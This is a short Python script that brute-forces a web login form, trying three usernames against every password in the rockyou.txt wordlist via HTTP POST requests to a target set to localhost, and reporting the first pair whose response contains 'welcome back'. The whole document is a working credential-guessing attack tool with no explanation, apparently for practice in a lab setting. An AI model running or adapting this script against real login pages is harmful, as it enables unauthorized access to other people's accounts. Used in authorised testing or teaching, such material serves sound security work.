import requests
import sys

target = "http://127.0.0.1"
usernames = ["admin", "user", "test"]
passwords = "rockyou.txt"
needle = "welcome back"

for user in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n")
            sys.stdout.write(f"[X] Attempting user:password -> {user}:{password}\r")
            sys.stdout.flush()

            r = requests.post(target, data={"username": user, "password": password})
            
            if needle in r.text:
                sys.stdout.write("\n")
                sys.stdout.write(f"\t [>>>>] Valid Password '{password}' found for user '{user}'!\n")
                sys.exit()  # Exit after finding the correct username-password combo
    
    sys.stdout.write(f"\n\tNo Password Found for '{user}'!\n")
